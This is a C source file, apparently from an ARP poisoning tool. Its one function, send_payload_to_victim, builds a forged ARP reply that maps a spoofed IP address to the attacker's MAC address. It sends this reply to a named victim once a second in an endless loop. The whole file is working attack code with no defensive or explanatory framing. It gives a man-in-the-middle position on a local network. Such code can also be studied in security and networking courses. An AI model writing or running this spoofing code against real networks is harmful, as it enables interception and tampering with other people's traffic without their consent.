#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include "arp_poisoning.h"
#include "packets.h"

char send_payload_to_victim(const int sd,
					       struct sockaddr_ll *device,
					       const uint8_t *my_mac_address,
					       const char *spoofed_ip_source,
					       const uint8_t *victim_mac_address,
					       const char *victim_ip)
{
  t_ethernet_packet	*ethernet_packet;
  t_arp_packet		*arp_packet;

  if (!(arp_packet = create_arp_packet(ARPOP_REPLY, my_mac_address, spoofed_ip_source, victim_mac_address, victim_ip)))
    return (fprintf(stderr, "ERROR_PACKET_CREATION_ARP"), FALSE);

  if (!(ethernet_packet = create_ethernet_packet(my_mac_address, victim_mac_address, arp_packet)))
    return (fprintf(stderr, "ERROR_PACKET_CREATION_ETHER"), FALSE);

  while (1)
    {
      if ((sendto(sd, ethernet_packet, ARP_HEADER_LENGTH + ETH_HEADER_LENGTH, 0,
		  (const struct sockaddr *)device, sizeof(*device))) <= 0)
	      return (fprintf(stderr, "ERROR_COULD_NOT_SEND"), FALSE);

      fprintf(stdout, "Packet sent to '%s'\n", victim_ip);
      sleep(1);
    }
  return (1);
}
